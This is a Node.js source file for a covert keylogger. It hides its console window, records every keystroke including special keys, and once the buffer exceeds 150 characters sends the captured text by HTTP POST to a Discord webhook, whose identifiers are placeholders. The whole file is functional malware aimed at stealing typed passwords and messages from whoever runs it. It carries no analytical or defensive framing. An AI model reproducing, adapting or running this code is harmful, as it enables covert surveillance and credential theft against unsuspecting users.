

var HOOK = "https://discord.com/api/webhooks/<URL>/<URL>";
let log = '';
let fs = require('fs');
const zlib = require('zlib');
let log_size = 150;
let keylogger = require("keylogger.js"); // include the zip folder with the keylogger
let axios = require("axios");

const ConsoleWindow = require("node-hide-console-window");
ConsoleWindow.hideConsole();
keylogger.start((key, isKeyUp) => {
  if(isKeyUp == false){
    key = key.toString().toLowerCase()
    if(key == 'spacebar'){
        log += '[spacebar]'
    }
    else if(key == 'tab'){
        log += '[tab]'
    }
    else if(key == 'shift'){
        log += '[shift]'
    }
    else if(key == 'enter'){
        log += '[enter]'
    }
    else if(key == 'control'){
        log += '[ctrl]'
    }
    else if(key == 'delete'){
        log += '[del]'
    }
    else if(key == 'alt'){
        log += '[alt]'
    }
    else if(key == 'backspace'){
        log += '[backspace]'
    }
    else if(key == 'capslock'){
        log += '[caps_lock]'
    }
    else if(key == 'meta'){
        log += '[windows_key]'
    }
    else if(key == 'escape'){
        log += '[esc]'
    }
    else if(key == 'end'){
        log += '[end]'
    }
    else if(key == 'home'){
        log += '[home]'
    }
    else if(key == 'insert'){
        log += '[ins]'
    }
    else if(key == 'arrowup'){
        log += '[↑]'
    }
    else if(key == 'arrowdown'){
        log += '[↓]'
    }
    else if(key == 'arrowleft'){
        log += '[←]'
    }
    else if(key == 'arrowright'){
        log += '[→]'
    }
    else if(key == 'f1'){
        log += '[f1]'
    }
    else if(key == 'f2'){
        log += '[f2]'
    }
    else if(key == 'f3'){
        log += '[f3]'
    }
    else if(key == 'f4'){
        log += '[f4]'
    }
    else if(key == 'f5'){
        log += '[f5]'
    }
    else if(key == 'f6'){
        log += '[f6]'
    }
    else if(key == 'f7'){
        log += '[f7]'
    }
    else if(key == 'f8'){
        log += '[f8]'
    }
    else if(key == 'f9'){
        log += '[f9]'
    }
    else if(key == 'f10'){
        log += '[f10]'
    }
    else if(key == 'f11'){
        log += '[f11]'
    }
    else if(key == 'f12'){
        log += '[f12]'
    }
    else if(key == 'pageup'){
        log += '[page_up]'
    }
    else if(key == 'pagedown'){
        log += '[page_down]'
    }
    else if(key == 'printscreen'){
        log += '[prt_scn]'
    }
    else if(key.charCodeAt(0) == 0){
        log += '[?]'
    }
    else{
        log += key
    }
    if(log.length > log_size){
        main();
        console.log(log);
        log = '';
    }
  }
});
async function send_logs(){
    if(log != ''){
        axios({
            method: 'post',
            url: HOOK,
            data: {
                'content': log
            }
        }).then(res => null).catch(err => send_logs());
    }
}

async function main() {
    await send_logs();
}